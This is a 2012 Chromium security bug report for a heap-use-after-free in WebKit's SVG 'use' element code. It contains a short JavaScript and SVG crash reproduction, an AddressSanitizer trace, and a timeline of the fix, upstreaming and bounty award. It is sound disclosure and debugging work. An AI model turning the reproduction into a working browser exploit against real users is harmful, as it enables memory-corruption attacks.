# Heap-use-after-free in WebCore::ContainerNode::appendChild

| Field | Value |
|-------|-------|
| **Issue ID** | [40053174](https://issues.chromium.org/issues/40053174) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>SVG |
| **Reporter** | ax...@gmail.com |
| **Assignee** | sc...@chromium.org |
| **Created** | 2012-02-01 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

Use-after-free can be triggered when when trying to append child in SVG for "use" element.

**VERSION**  

18.0.1024.0 (Developer Build 119669 Linux)  

Does not work on 16.0.912.77 m, Win7 x64.

**REPRODUCTION CASE**

<script>
function go() {
q = document.getElementById('root').contentDocument;
q.firstChild.setAttribute('style', 'content:counter(item)');
document.designMode = 'on';
q.execCommand('selectAll');
q.execCommand('insertImage');
q.getElementById('x').appendChild( q.firstChild.cloneNode(1) );
q.execCommand('undo');
}
</script>

<object data="t.svg" id="root" onload="go()"/></object>

--- t.svg ---  

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">  

<text id="x">a</text>  

<use xlink:href="#x"/>  

<text>a</text>  

<style></style>  

</svg>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

==8025== ERROR: AddressSanitizer heap-use-after-free on address 0x7fcadb019ca4 at pc 0x7fcb11efd457 bp 0x7fff4727f5f0 sp 0x7fff4727f5e8  

READ of size 4 at 0x7fcadb019ca4 thread T0  

#0 0x7fcb11efd457 in WebCore::Node::attached() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:684  

#1 0x7fcb13ef2a4b in WebCore::SVGUseElement::buildShadowTree(WebCore::SVGShadowTreeRootElement\*, WebCore::SVGElement\*, WebCore::SVGElementInstance\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGUseElement.cpp:809  

#2 0x7fcb13ef18de in WebCore::SVGUseElement::buildShadowAndInstanceTree(WebCore::SVGShadowTreeRootElement\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGUseElement.cpp:561  

#3 0x7fcb13f67e03 in WTF::RefPtr[WebCore::SVGShadowTreeRootElement](javascript:void(0);)::operator->() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:66  

#4 0x7fcb13ef491e in WebCore::Node::renderer() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:473  

#5 0x7fcb11efc021 in WebCore::ContainerNode::insertBefore(WTF::PassRefPtr[WebCore::Node](javascript:void(0);), WebCore::Node\*, int&, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:196  

#6 0x7fcb13008fdb in WebCore::RemoveNodeCommand::doUnapply() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/RemoveNodeCommand.cpp:63  

#7 0x7fcb12f90e78 in WebCore::EditCommandComposition::unapply() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/CompositeEditCommand.cpp:105  

#8 0x7fcb119e97d2 in WTF::RefCountedBase::derefBase() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:127  

#9 0x7fcb12910bc0 in WebCore::executeUndo(WebCore::Frame\*, WebCore::Event\*, WebCore::EditorCommandSource, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/EditorCommand.cpp:1095  

#10 0x7fcb12909701 in WebCore::Editor::Command::execute(WTF::String const&, WebCore::Event\*) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/EditorCommand.cpp:1665  

#11 0x7fcb11f3e786 in WebCore::Document::execCommand(WTF::String const&, bool, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:4174  

#12 0x7fcb139d114b in WebCore::DocumentInternal::execCommandCallback(v8::Arguments const&) /media/Chromium/chromium/depot\_tools/src/out/Release/obj/gen/webcore/bindings/V8Document.cpp:1503  

#13 0x7fcb10e4c0c3 in HandleApiCallHelper /media/Chromium/chromium/depot\_tools/src/v8/src/builtins.cc:1220  

#14 0x7fcade50420e  

#15 0x7fcade528717  

#16 0x7fcade529dfb  

#17 0x7fcade52a035  

#18 0x7fcade51fba7  

#19 0x7fcade507497  

#20 0x7fcb10e99278 in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) /media/Chromium/chromium/depot\_tools/src/v8/src/execution.cc:118  

#21 0x7fcb10dfeba2 in v8::Function::Call(v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/v8/src/api.cc:3603  

#22 0x7fcb1268a6ee in WebCore::V8Proxy::instrumentedCallFunction(WebCore::Page\*, v8::Handle[v8::Function](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:432  

#23 0x7fcb1268a15b in WebCore::V8Proxy::callFunction(v8::Handle[v8::Function](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:407  

#24 0x7fcb1267d44e in WebCore::V8LazyEventListener::callListenerFunction(WebCore::ScriptExecutionContext\*, v8::Handle[v8::Value](javascript:void(0);), WebCore::Event\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8LazyEventListener.cpp:75  

#25 0x7fcb12e7d254 in WebCore::V8AbstractEventListener::invokeEventHandler(WebCore::ScriptExecutionContext\*, WebCore::Event\*, v8::Handle[v8::Value](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8AbstractEventListener.cpp:152  

#26 0x7fcb12e7cf39 in ~Scope /media/Chromium/chromium/depot\_tools/src/v8/include/v8.h:3550  

#27 0x7fcb11f9baa1 in WebCore::EventTarget::fireEventListeners(WebCore::Event\*, WebCore::EventTargetData\*, WTF::Vector<WebCore::RegisteredEventListener, 1ul>&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/EventTarget.cpp:228  

#28 0x7fcb11f9b5f0 in WebCore::Event::defaultPrevented() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Event.h:133  

#29 0x7fcb11fce5c2 in WebCore::Node::handleLocalEvents(WebCore::Event\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:2747  

#30 0x7fcb12086cc8 in WTF::PassRefPtr[WebCore::Event](javascript:void(0);)::operator->() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:76  

#31 0x7fcb120822a4 in WebCore::EventDispatchMediator::dispatchEvent(WebCore::EventDispatcher\*) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/EventDispatchMediator.cpp:51  

#32 0x7fcb12084012 in WebCore::EventDispatcher::dispatchEvent(WebCore::Node\*, WTF::PassRefPtr[WebCore::EventDispatchMediator](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/EventDispatcher.cpp:55  

#33 0x7fcb11fcebf7 in WebCore::Node::dispatchEvent(WTF::PassRefPtr[WebCore::Event](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:2761  

#34 0x7fcb12cb37de in WebCore::DOMWindow::dispatchLoadEvent() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/DOMWindow.cpp:1606  

#35 0x7fcb11f2403e in WebCore::Document::dispatchWindowLoadEvent() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:3696  

#36 0x7fcb12bc2926 in WebCore::FrameLoader::checkCompleted() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:794  

#37 0x7fcb12bbf1e8 in WebCore::FrameLoader::finishedParsing() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:678  

#38 0x7fcb11f430ba in WebCore::Frame::page() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/Frame.h:345  

#39 0x7fcb12ba45d4 in WebCore::DocumentWriter::endIfNotLoadingMainResource() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/DocumentWriter.cpp:233  

#40 0x7fcb12bdb9d9 in WebCore::ResourceErrorBase::isNull() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/network/ResourceErrorBase.h:42  

#41 0x7fcb12c026d1 in WebCore::MainResourceLoader::didFinishLoading(double) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:485  

#42 0x7fcb142e637d in webkit\_glue::WebURLLoaderImpl::Context::OnCompletedRequest(net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) /media/Chromium/chromium/depot\_tools/src/webkit/glue/weburlloader\_impl.cc:654  

#43 0x7fcb118a0c0a in ResourceDispatcher::OnRequestComplete(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:489  

#44 0x7fcb118a1e3b in void DispatchToMethod<ResourceDispatcher, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&), int, net::URLRequestStatus, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> >, base::TimeTicks>(ResourceDispatcher\*, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&), Tuple4<int, net::URLRequestStatus, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> >, base::TimeTicks> const&) /media/Chromium/chromium/depot\_tools/src/./base/tuple.h:566  

#45 0x7fcb1189e38c in ResourceDispatcher::DispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:559  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

BFD: Dwarf Error: Offset (1949266029) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (80989744).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (55251802).  

#46 0x7fcb1189c260 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:326  

#47 0x7fcb117a559f in ChildThread::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/child\_thread.cc:171  

#48 0x7fcb118f4cc9 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:263  

#49 0x7fcb101244a6 in base::Callback<void ()()>::Run() const /media/Chromium/chromium/depot\_tools/src/./base/callback.h:272  

#50 0x7fcb10124d08 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:470  

#51 0x7fcb10125ff9 in MessageLoop::DoWork() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:660  

#52 0x7fcb10130b27 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:28  

#53 0x7fcb1012303e in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:418  

#54 0x7fcb1012122f in ~AutoRunState /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:745  

#55 0x7fcb14e8dece in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#56 0x7fcb1007c898 in RunZygote /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:233  

#57 0x7fcb1007bcf2 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:457  

#58 0x7fcb0e7c2bc7 in ChromeMain /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_main.cc:32  

#59 0x7fcb0e7c2acb in main /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#60 0x7fcb07becd8e in \_\_libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

0x7fcadb019ca4 is located 36 bytes inside of 376-byte region [0x7fcadb019c80,0x7fcadb019df8)  

freed by thread T0 here:  

#0 0x7fcb160de042 in operator delete(void\*) ??:0  

#1 0x7fcb13f67779 in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/svg/RenderSVGTransformableContainer.h:30  

#2 0x7fcb1341e9b6 in WebCore::RenderObject::arenaDelete(WebCore::RenderArena\*, void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.cpp:2294  

#3 0x7fcb11fbf4cc in WebCore::Node::detach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:1352  

#4 0x7fcb11f821ee in WebCore::Element::detach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.cpp:975  

#5 0x7fcb13ef49ef in WTF::RefPtr[WebCore::SVGElementInstance](javascript:void(0);)::operator!() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:68  

#6 0x7fcb11f03db9 in WebCore::Node::nextSibling() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:160  

#7 0x7fcb11f821ee in WebCore::Element::detach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.cpp:975  

#8 0x7fcb11f83709 in WebCore::Node::reattach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:831  

#9 0x7fcb11f22b62 in WebCore::Node::nextSibling() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:160  

#10 0x7fcb11f2573e in WebCore::Document::styleSelectorChanged(WebCore::StyleSelectorUpdateFlag) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:3024  

#11 0x7fcb11f31817 in WTF::RefPtr[WebCore::DocumentParser](javascript:void(0);)::get() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:60  

#12 0x7fcb15a37064 in WebCore::StyleElement::sheetLoaded(WebCore::Document\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/StyleElement.cpp:187  

#13 0x7fcb13e8efee in WebCore::SVGStyleElement::sheetLoaded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGStyleElement.h:61  

#14 0x7fcb12854e10 in WebCore::CSSStyleSheet::checkLoaded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/css/CSSStyleSheet.cpp:240  

#15 0x7fcb15a36b81 in WebCore::StyleElement::createSheet(WebCore::Element\*, int, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/StyleElement.cpp:172  

#16 0x7fcb15a35bdd in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#17 0x7fcb11f03fcb in WebCore::Node::nextSibling() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:160  

#18 0x7fcb11f7fa27 in WebCore::Node::getFlag(WebCore::Node::NodeFlags) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:684  

#19 0x7fcb13ea12fe in WebCore::SVGStyledElement::updateRelativeLengthsInformation() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGStyledElement.h:78  

#20 0x7fcb11f03fcb in WebCore::Node::nextSibling() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:160  

#21 0x7fcb11f7fa27 in WebCore::Node::getFlag(WebCore::Node::NodeFlags) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:684  

#22 0x7fcb13ea12fe in WebCore::SVGStyledElement::updateRelativeLengthsInformation() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGStyledElement.h:78  

#23 0x7fcb11efe3c9 in WebCore::notifyChildInserted(WebCore::Node\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:1102  

#24 0x7fcb11efcc3a in WebCore::ContainerNode::appendChild(WTF::PassRefPtr[WebCore::Node](javascript:void(0);), int&, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:667  

#25 0x7fcb13ef2a4b in WebCore::SVGUseElement::buildShadowTree(WebCore::SVGShadowTreeRootElement\*, WebCore::SVGElement\*, WebCore::SVGElementInstance\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGUseElement.cpp:809  

#26 0x7fcb13ef18de in WebCore::SVGUseElement::buildShadowAndInstanceTree(WebCore::SVGShadowTreeRootElement\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGUseElement.cpp:561  

#27 0x7fcb13f67e03 in WTF::RefPtr[WebCore::SVGShadowTreeRootElement](javascript:void(0);)::operator->() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:66  

#28 0x7fcb13ef491e in WebCore::Node::renderer() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:473  

#29 0x7fcb11efc021 in WebCore::ContainerNode::insertBefore(WTF::PassRefPtr[WebCore::Node](javascript:void(0);), WebCore::Node\*, int&, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:196  

previously allocated by thread T0 here:  

#0 0x7fcb160ddec2 in operator new(unsigned long) ??:0  

#1 0x7fcb13f78452 in WebCore::SVGShadowTreeRootElement::create(WebCore::Document\*, WebCore::SVGUseElement\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/svg/SVGShadowTreeElements.cpp:75  

#2 0x7fcb13f67adc in WebCore::RenderSVGShadowTreeRootContainer::updateFromElement() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/svg/RenderSVGShadowTreeRootContainer.cpp:56  

#3 0x7fcb13ef491e in WebCore::Node::renderer() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:473  

#4 0x7fcb11efc021 in WebCore::ContainerNode::insertBefore(WTF::PassRefPtr[WebCore::Node](javascript:void(0);), WebCore::Node\*, int&, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:196  

#5 0x7fcb13008fdb in WebCore::RemoveNodeCommand::doUnapply() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/RemoveNodeCommand.cpp:63  

#6 0x7fcb12f90e78 in WebCore::EditCommandComposition::unapply() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/CompositeEditCommand.cpp:105  

#7 0x7fcb119e97d2 in WTF::RefCountedBase::derefBase() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:127  

#8 0x7fcb12910bc0 in WebCore::executeUndo(WebCore::Frame\*, WebCore::Event\*, WebCore::EditorCommandSource, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/EditorCommand.cpp:1095  

#9 0x7fcb12909701 in WebCore::Editor::Command::execute(WTF::String const&, WebCore::Event\*) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/editing/EditorCommand.cpp:1665  

#10 0x7fcb11f3e786 in WebCore::Document::execCommand(WTF::String const&, bool, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:4174  

#11 0x7fcb139d114b in WebCore::DocumentInternal::execCommandCallback(v8::Arguments const&) /media/Chromium/chromium/depot\_tools/src/out/Release/obj/gen/webcore/bindings/V8Document.cpp:1503  

#12 0x7fcb10e4c0c3 in HandleApiCallHelper /media/Chromium/chromium/depot\_tools/src/v8/src/builtins.cc:1220  

#13 0x7fcade50420e  

#14 0x7fcade528717  

#15 0x7fcade529dfb  

#16 0x7fcade52a035  

#17 0x7fcade51fba7  

#18 0x7fcade507497  

#19 0x7fcb10e99278 in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) /media/Chromium/chromium/depot\_tools/src/v8/src/execution.cc:118  

#20 0x7fcb10dfeba2 in v8::Function::Call(v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/v8/src/api.cc:3603  

#21 0x7fcb1268a6ee in WebCore::V8Proxy::instrumentedCallFunction(WebCore::Page\*, v8::Handle[v8::Function](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:432  

#22 0x7fcb1268a15b in WebCore::V8Proxy::callFunction(v8::Handle[v8::Function](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:407  

==8025== ABORTING  

Stats: 38M malloced (27M for red zones) by 75283 calls  

Stats: 3M realloced by 3261 calls  

Stats: 34M freed by 62217 calls  

Stats: 0M really freed by 0 calls  

Stats: 96M (24591 full pages) mmaped in 24 calls  

mmaps by size class: 8:65532; 9:16382; 10:8190; 11:2047; 12:1024; 13:1536; 14:256; 15:256; 16:64; 17:64; 18:16; 19:8; 21:6;  

mallocs by size class: 8:58961; 9:8571; 10:4481; 11:1313; 12:487; 13:1075; 14:178; 15:126; 16:24; 17:45; 18:10; 19:7; 21:5;  

frees by size class: 8:47478; 9:7863; 10:4088; 11:1002; 12:396; 13:1043; 14:160; 15:117; 16:17; 17:31; 18:10; 19:7; 21:5;  

rfrees by size class:  

Stats: malloc large: 67 small slow: 367  

Shadow byte and word:  

0x1ff95b603394: fd  

0x1ff95b603390: fd fd fd fd fd fd fd fd  

More shadow bytes:  

0x1ff95b603370: fa fa fa fa fa fa fa fa  

0x1ff95b603378: fa fa fa fa fa fa fa fa  

0x1ff95b603380: fa fa fa fa fa fa fa fa  

0x1ff95b603388: fa fa fa fa fa fa fa fa  

=>0x1ff95b603390: fd fd fd fd fd fd fd fd  

0x1ff95b603398: fd fd fd fd fd fd fd fd  

0x1ff95b6033a0: fd fd fd fd fd fd fd fd  

0x1ff95b6033a8: fd fd fd fd fd fd fd fd  

0x1ff95b6033b0: fd fd fd fd fd fd fd fd

## Timeline

### sk...@chromium.org (2012-02-01)

https://cluster-fuzz.appspot.com/testcase?key=17420566

### sk...@chromium.org (2012-02-01)

Crash type	Heap-use-after-free READ 4
Crash address	0x7f6904f0d0a4
Crash state	- crash stack -
WebCore::ContainerNode::appendChild
WebCore::SVGUseElement::buildShadowTree
- free stack -
operator delete
WebCore::RenderSVGShadowTreeRootContainer::~RenderSVGShadowTreeRootContainer

### in...@chromium.org (2012-02-01)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=17420566

Uploader: skylined@chromium.org

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7f6aa6431ea4
Crash State:
  - crash stack -
  WebCore::ContainerNode::appendChild
  WebCore::SVGUseElement::buildShadowTree
  - free stack -
  WebCore::RenderSVGShadowTreeRootContainer::~RenderSVGShadowTreeRootContainer
  WebCore::RenderObject::arenaDelete
  

Minimized Testcase (0.62 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95gyoYck43vmnkhrM8xSMEicCqb-awocHT688w3u9wOzMkCNz-SLzl75tI1ulZkE6tx7tIjwFMeNo-M6zuUVm7b7XFjA6Yks1zzbmD5hdbKLvosRrrn_bUumnLHOcIV3VE9v-fXk1NIN3j0os2Npge4et0JEw

### in...@chromium.org (2012-02-01)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-02-05)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-02-06)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-02-15)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-02-16)

Upstreamed as https://bugs.webkit.org/show_bug.cgi?id=78838

### sc...@chromium.org (2012-02-17)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-02-23)

The issue will be fixed by https://bugs.webkit.org/show_bug.cgi?id=78902. I have verified that the patch up there fixes this issue.

Unfortunately, that will not be mergable back into earlier branches. Please advise on whether I should take the time to find a fix for earlier branches (pre m19, maybe even pre-m20 or 21). I am assuming yes.

### sc...@gmail.com (2012-02-24)

Thanks for the note. I'll start an e-mail thread :)

### sc...@chromium.org (2012-03-01)

The fix for this was committed to webkit in 2 revisions (the first one failed and was patched over, not rolled-out). See r109299 <http://trac.webkit.org/changeset/109299> and r109333 <http://trac.webkit.org/changeset/109333>.

This is sufficiently complex that I will make a new patch to apply to the m17 and m18 branches. Real soon now, I hope.

### sc...@chromium.org (2012-03-02)

Merges complete and tracked in http://code.google.com/p/chromium/issues/detail?id=116474

We're done. Thanks to all the team.

### in...@chromium.org (2012-03-02)

Stephen rocks! SVG Team rocks! I would still ask to try browsing with some svg stuff tmrw since this is one of those patches that didnt get time to bake on trunk.

### sc...@gmail.com (2012-03-02)

Cool. I've lost track of the list of bugs addressed by http://code.google.com/p/chromium/issues/detail?id=116474, can we enumerate them there? Need it for Chromium Security Reward tracking :)

### sc...@chromium.org (2012-03-02)

This fix covered cr112212 (this bug), cr114180 and cr114581. The last 2 were marked as a dupe of this one.

Reward? Really?

### in...@chromium.org (2012-03-02)

I think Chris meant to ask which bugs were fixed by the generic fix. Two of these 112212 and 114180 were external reporters. We will work out the reward nominations.

### sc...@gmail.com (2012-03-03)

@Ax330d: thanks for this bug! We're actually going to reward $2000 because the two similar bugs you provided led to a more generic and robust fix.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-21)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

